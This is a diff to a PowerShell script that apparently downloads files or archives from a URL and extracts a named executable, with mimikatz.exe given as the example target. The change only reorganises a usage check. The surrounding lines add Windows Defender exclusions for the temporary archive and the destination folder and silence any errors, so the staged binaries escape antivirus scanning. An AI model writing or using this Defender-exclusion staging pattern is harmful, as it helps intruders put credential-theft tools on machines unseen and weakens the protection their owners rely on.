@@ -77,9 +77,17 @@ $ErrorActionPreference = "Stop"
 $FilePath = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($FilePath)
 
 $urlMode = $URL -ne ""
+$isZip   = $urlMode -and ($URL -match '\.(zip|7z)(\?.*)?$')
 
 # ── If FilePath is a directory and URL provided, derive filename from URL ─────
 if ($urlMode -and (Test-Path $FilePath -PathType Container)) {
+    if ($isZip) {
+        Write-Error ("Incorrect usage: -FilePath is a directory but -URL points to a ZIP archive.`n" +
+                     "Specify the target file you want extracted from the ZIP, not a directory.`n" +
+                     "The script searches inside the ZIP for the filename you provide.`n" +
+                     "Example: -FilePath '.\mimikatz.exe' -URL '$URL'")
+        exit 1
+    }
     $urlFileName = Split-Path -Path ([System.Uri]$URL).LocalPath -Leaf
     $FilePath    = Join-Path (Resolve-Path $FilePath) $urlFileName
     Write-Host "[+] Directory provided - saving as: $FilePath" -ForegroundColor Cyan
@@ -110,11 +118,6 @@ if ($urlMode) {
     $destDir  = Split-Path $FilePath -Parent
 
     if ($isZip) {
-        # ZIP: FilePath must include the target filename so the script knows what to extract
-        if (Test-Path $FilePath -PathType Container) {
-            Write-Error "ZIP download requires a full file path including the target filename - the script searches inside the ZIP for that filename.`nExample: -FilePath 'C:\Users\lobyo\mimikatz.exe' -URL '$URL'"
-            exit 1
-        }
         $zipTemp = Join-Path $env:TEMP ([System.IO.Path]::GetRandomFileName() + ".zip")
         Add-MpPreference -ExclusionPath $zipTemp  -ErrorAction SilentlyContinue
         Add-MpPreference -ExclusionPath $destDir  -ErrorAction SilentlyContinue
